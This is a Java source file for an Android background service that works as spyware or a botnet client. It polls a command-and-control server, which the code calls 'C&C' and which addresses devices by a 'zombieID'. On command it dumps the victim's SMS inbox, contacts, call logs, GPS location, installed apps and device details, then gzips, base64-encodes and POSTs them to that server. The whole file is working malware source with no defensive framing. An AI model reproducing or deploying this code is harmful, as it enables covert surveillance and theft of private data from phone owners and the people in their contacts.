package com.app.checker;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.TimeZone;
import java.util.UUID;
import java.util.zip.GZIPOutputStream;

public class Fetcher extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Check or store UUID to uniquely identify the device
        SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        final String id = sPrefs.getString("uuid", null);
        if (id == null) {
            SharedPreferences.Editor editor = sPrefs.edit();
            UUID uuid = java.util.UUID.randomUUID();
            editor.putString("uuid", uuid.toString());
            editor.commit(); // Store UUID permanently in the device
        }

        try {
            if (isConnected()) { // Check if device has a network connection
                new JsonTask().execute(getString(R.string.cc) + "?uuid=" + id);
            } else {
                Log.d("Connectivity", "No network connection");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Service.START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // HTTP Request for JSON objects
    private class JsonTask extends AsyncTask<String, String, String> {
        protected void onPreExecute() {
            super.onPreExecute();
        }

        private static final String REQUEST_METHOD = "GET";
        private static final int READ_TIMEOUT = 15000;
        private static final int CONNECTION_TIMEOUT = 15000;

        @Override
        protected String doInBackground(String... params) {
            HttpURLConnection conn = null;
            BufferedReader buff = null;
            try {
                URL url = new URL(params[0]);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(REQUEST_METHOD);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setConnectTimeout(CONNECTION_TIMEOUT);
                conn.connect();

                InputStream stream = conn.getInputStream();

                buff = new BufferedReader(new InputStreamReader(stream));
                StringBuffer buffer = new StringBuffer();

                String line;
                while ((line = buff.readLine()) != null) {
                    buffer.append(line);
                }
                return buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
                try {
                    if (buff != null) {
                        buff.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        // After fetching JSON response
        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);

            if (result != null) { // Check if the server is reachable
                try {
                    JSONObject json = new JSONObject(result);
                    String task = json.getString("task");
                    String zombieID = json.getString("uuid");
                    SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                    final String uuid = sPrefs.getString("uuid", null);

                    if (zombieID.equals(uuid) || zombieID.equals("ffffffff-ffff-ffff-ffff-ffffffffffff")) {
                        switch (task) {
                            case "kill":
                                killService();
                                break;
                            case "smsDump":
                                sendData(task, uuid, fetchInbox());
                                break;
                            case "contactsDump":
                                sendData(task, uuid, fetchContacts());
                                break;
                            case "callsDump":
                                sendData(task, uuid, fetchCallLogs());
                                break;
                            case "getGeoLocation":
                                sendData(task, uuid, getLastLocation());
                                break;
                            case "appsDump":
                                sendData(task, uuid, fetchApps());
                                break;
                            case "deviceInfo":
                                sendData(task, uuid, deviceInfo());
                                break;
                        }
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else {
                Log.d("Connectivity", "Server is not reachable");
            }
        }
    }

    public boolean isConnected() {
        ConnectivityManager connMan = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connMan != null) {
            NetworkInfo netInfo = connMan.getActiveNetworkInfo();
            if (netInfo != null && netInfo.isConnected()) return true;
            else return false;
        } else return false;
    }

    private void killService() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
        if (alarmManager != null) {
            alarmManager.cancel(pintent);
            stopSelf();
        }
    }

    // Method to dump SMS messages
    private ArrayList<String> fetchInbox() {
        ArrayList<String> sms = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Uri uri = Uri.parse("content://sms/");
            Cursor cursor = cr.query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
            if (cursor != null) {
                cursor.moveToFirst();
                for (int i = 0; i < cursor.getCount(); i++) {
                    String id = cursor.getString(0);
                    String address = cursor.getString(1);
                    Long dateMil = cursor.getLong(2);
                    String body = cursor.getString(3);
                    Date date = new Date(dateMil);
                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault());
                    formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
                    String formatted = formatter.format(date);
                    sms.add("\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        }
        return sms;
    }

    // Method to dump phone contacts
    private ArrayList<String> fetchContacts() {
        ArrayList<String> info = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if ((cursor != null ? cursor.getCount() : 0) > 0) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex((ContactsContract.Contacts.DISPLAY_NAME)));

                    if (cursor.getInt(cursor.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null
                        );

                        if (pCur != null) {
                            while (pCur.moveToNext()) {
                                String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                info.add("\n ID=>" + id + "\n Name=>" + name + "\n Phone Number" + phoneNumber + "\n");
                            }
                            pCur.close();
                        }
                    }
                }
                cursor.close();
            }
        }
        return info;
    }

    // Method to dump call logs
    private ArrayList<String> fetchCallLogs() {
        ArrayList<String> logs = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

            while (cursor.moveToNext()) {
                String phNumber = cursor.getString(number);
                String callType = cursor.getString(type);
                String callDate = cursor.getString(date);
                java.util.Date callDayTime = new java.util.Date(Long.valueOf(callDate));
                String callDuration = cursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                logs.add("\n Phone Number=>" + phNumber + "\nType =>" + dir + "\nDate =>" + callDayTime + "\nDuration =>" + callDuration + "\n");
            }
            cursor.close();
        }
        return logs;
    }

    // Method to retrieve geographical location
    ArrayList<String> geoLocation = new ArrayList<>();

    private ArrayList<String> getLastLocation() {
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
            FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
            mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
                @Override
                public void onSuccess(Location location) {
                    if (location != null) {
                        double latitude = location.getLatitude();
                        double longitude = location.getLongitude();
                        geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);

                    } else {
                        geoLocation.add("N/A");
                    }
                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            e.printStackTrace();
                        }
                    });
        }
        return geoLocation;
    }

    // Method to dump installed non-system applications
    private ArrayList<String> fetchApps() {
        ArrayList<String> apps = new ArrayList<>();
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                apps.add("\n ID => " + i + "\n Application => " + appName + "\n");
            }
        }
        return apps;
    }

    // Method to retrieve device information
    private ArrayList<String> deviceInfo() {
        ArrayList<String> info = new ArrayList<>();
        info.add("\n Serial => " + Build.SERIAL + "\n");
        info.add("\n Model => " + Build.MODEL + "\n");
        info.add("\n ID => " + Build.ID + "\n");
        info.add("\n Manufacturer => " + Build.MANUFACTURER + "\n");
        info.add("\n Brand => " + Build.BRAND + "\n");
        info.add("\n Type => " + Build.TYPE + "\n");
        info.add("\n User => " + Build.USER + "\n");
        info.add("\n Base => " + Build.VERSION_CODES.BASE + "\n");
        info.add("\n Incremental => " + Build.VERSION.INCREMENTAL + "\n");
        info.add("\n SDK => " + Build.VERSION.SDK + "\n");
        info.add("\n Board => " + Build.BOARD + "\n");
        info.add("\n Host => " + Build.HOST + "\n");
        info.add("\n Fingerprint => " + Build.FINGERPRINT + "\n");
        info.add("\n Release => " + Build.VERSION.RELEASE + "\n");
        return info;
    }

    // Send data to C&C
    public void sendData(String task, String uuid, ArrayList requestBody) {
        try {
            RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
            String URL = getString(R.string.cc);
            String initial = String.valueOf(requestBody);
            final byte[] gzip = compress(initial);
            final String base64 = Base64.encodeToString(gzip, Base64.DEFAULT);
            final String enc = URLEncoder.encode(base64, "utf-8");
            final String data = "task= " + task + "&uuid=" + uuid + "&data=" + enc;

            StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.i("VOLLEY", response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e("VOLLEY", error.toString());
                }
            }) {
                @Override
                public String getBodyContentType() {
                    return "application/x-www-form-urlencoded; charset=utf-8";
                }

                @Override
                public byte[] getBody() {
                    try {
                        return data.getBytes();
                    } catch (Exception uee) {
                        VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", data, "utf-8");
                        return null;
                    }
                }

                @Override
                protected Response<String> parseNetworkResponse(NetworkResponse response) {
                    String responseString = "";
                    if (response != null) {
                        responseString = String.valueOf(response.statusCode);
                        // can get more details such as response.headers
                    }
                    return Response.success(responseString, HttpHeaderParser.parseCacheHeaders(response));
                }
            };
            requestQueue.add(stringRequest);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] compress(String string) throws IOException {
        ByteArrayOutputStream os = new ByteArrayOutputStream(string.length());
        GZIPOutputStream gos = new GZIPOutputStream(os);
        gos.write(string.getBytes());
        gos.close();
        byte[] compressed = os.toByteArray();
        os.close();
        return compressed;
    }
}